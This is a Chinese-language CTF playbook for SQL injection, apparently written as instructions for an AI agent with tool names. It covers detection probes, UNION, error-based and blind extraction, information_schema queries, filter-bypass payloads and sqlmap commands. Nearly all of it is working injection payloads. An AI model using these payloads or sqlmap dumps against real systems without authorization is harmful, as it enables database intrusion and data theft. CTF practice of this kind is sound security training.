# SQL 注入：判断 → 定型 → 取数 → bypass

总原则：**先确认注入存在和类型，再决定手工还是 sqlmap**。CTF 题 sqlmap
能解决 70%，剩下 30% 是过滤绕过/二次注入/异构数据库，必须手工。

## 1. 确认注入（按顺序试，记录每步响应）

对参数（GET/POST/cookie/header 都算）依次发：

```
1'           → 报错/500/内容变化？有 = 大概率字符型注入
1' and '1'='1  与  1' and '1'='2   → 两次响应不同 = 确认
1 and 1=1 / 1 and 1=2              → 数字型（无引号）
1")  1')  1"  1`                   → 括号/双引号/反引号包裹
```

- 报错信息直接读：MySQL 报 `syntax to use near ''` 会泄露语句结构；
  报 `You have an error in your SQL syntax` = MySQL/MariaDB。
- 什么都不显示：只有布尔差异（页面有无某行字）→ 布尔盲注；
  连布尔差异都没有 → 加 `and sleep(3)` 看响应时间 → 时间盲注。
- 每确认一步 post_fact（"id 参数字符型注入，单引号闭合"）。

## 2. 定型：选利用通道

优先级（从快到慢）：

1. **联合注入（UNION）**：先定列数 `order by 1,2,3...`（或 `order by 3-- -`
   递增到报错），再 `' union select 1,2,3-- -` 看哪列回显在页面上。
   回显列换成 `database()`、`version()`、`group_concat(table_name)`。
2. **报错注入**：页面显示数据库错误时，
   `and updatexml(1,concat(0x7e,(select group_concat(table_name)
   from information_schema.tables where table_schema=database())),1)`
   或 `and extractvalue(1,concat(0x7e,(select ...)))`；`floor(rand(0)*2)`
   双查询报错是老题标配。
3. **布尔盲注**：`and substr(database(),1,1)='a'` 逐字符二分。
   必须写脚本（python_eval + requests），二分 7 次/字符。
4. **时间盲注**：`and if(substr(database(),1,1)='a',sleep(2),0)`。
   脚本同上，注意网络抖动：阈值取基线+1s，每字符重试 2 次。

注释符：`-- -`（MySQL 要求双横后有空格/任意字符）、`#`（URL 里 %23）、
`--%20`。闭合不了就试 `-1' union select ...#'`。

## 3. 取数流程（MySQL 标准路径）

```
当前库:   database()
全部库:   select group_concat(schema_name) from information_schema.schemata
表名:     select group_concat(table_name) from information_schema.tables
          where table_schema=database()       -- 别忘也可能在别的库（ctftraining 等）
列名:     select group_concat(column_name) from information_schema.columns
          where table_name='flag'
取值:     select group_concat(flag) from flag
```

- 回显长度被截断：`substr(x,1,30)` 分段取，或 `left/right`。
- union 列数对不上原表：`union select null,null,...` 逐步试。
- flag 经常不在第一眼看中的表里：表名单里 `flag`、`secret`、`ffflllaaaggg`
  之类全都要 dump。

## 4. 过滤 bypass（CTF 真正的考点）

**空格被滤**：
- `/**/` 注释当空格：`select/**/*/**/from/**/users`
- 括号包裹：`union(select(1),(2),(3))`；`and(1)=(1)`
- `%a0 %09 %0a %0b %0c %0d` 空白字符替代；`+` 在 URL 里就是空格（别 double encode）

**等号/比较符被滤**：
- `like`、`regexp`、`in`：`and database() like 'c%'`
- `between`：`and ascii(substr(database(),1,1)) between 97 and 122`
- 盲注比较用 `<`、`>` 也常漏网

**关键字被滤（select/union/and/or）**：
- 双写：`selselectect`、`uniunionon`（过滤只 replace 一次时有效，先试这个）
- 大小写：`UnIoN SeLeCt`（过滤没加 /i 时）
- 内联注释：`/*!select*/`、`/*!50000select*/`（MySQL 特有执行）
- and/or 被滤：`&&`、`||`；`xor`；`%26%26`

**引号被滤（magic_quotes 类）**：
- 字符串全用 hex：`0x666c6167` = 'flag'，如 `where table_name=0x666c6167`
- `char(102,108,97,103)`；宽字节：`%df'` 吃掉转义反斜杠（GBK 库）

**逗号被滤**：
- `substr(database() from 1 for 1)` 替代 `substr(x,1,1)`
- `union select 1,2,3` 改 `union select * from (select 1)a join (select 2)b join (select 3)c`
- limit 偏移：`limit 1 offset 0`

**information_schema 被滤（MySQL 5.7+ 高版本题）**：
- `sys.schema_auto_increment_columns`、`sys.schema_table_statistics_with_buffer`
- MySQL 8：`select table_name from mysql.innodb_table_stats where database_name=database()`
- 无列名注入：`union select 1,(select `3` from (select 1,2,3 union select * from users)a limit 1,1),3`（反引号按位置引用）

## 5. sqlmap 使用档位（有 select_tools 就激活 sqlmap 配方）

```
快速确认:  sqlmap -u "http://t/x?id=1" --batch --random-agent --level=1 --risk=1
POST:      sqlmap -u "http://t/login" --data "user=a&pass=b" --batch
取数:      --dbs → -D 库名 --tables → -D 库 -T 表 --columns → -D 库 -T 表 -C 列 --dump
过滤强时:  --tamper=space2comment,between,randomcase --level=3 --risk=2
盲注慢:    --threads=4（别超，会把靶机打挂）--technique=B/T 指定
cookie:    --cookie="PHPSESSID=xxx"（登录后的注入）
```

sqlmap 是长任务：配方 timeout 1800s，或 shell_exec background=true 后台跑，
同时手工思路并行推进。tamper 脚本对应 §4 的手工手法，打不通时回来手工。

## 6. 收尾

- dump 到 flag 先过格式自检（题目给的 flag_format），再 submit_flag。
- flag 值含特殊字符时原样取，别手工转小写/去空格（溯源要逐字）。
- 全过程关键结论（库名、表名、通道类型、过滤清单）全部 post_fact。
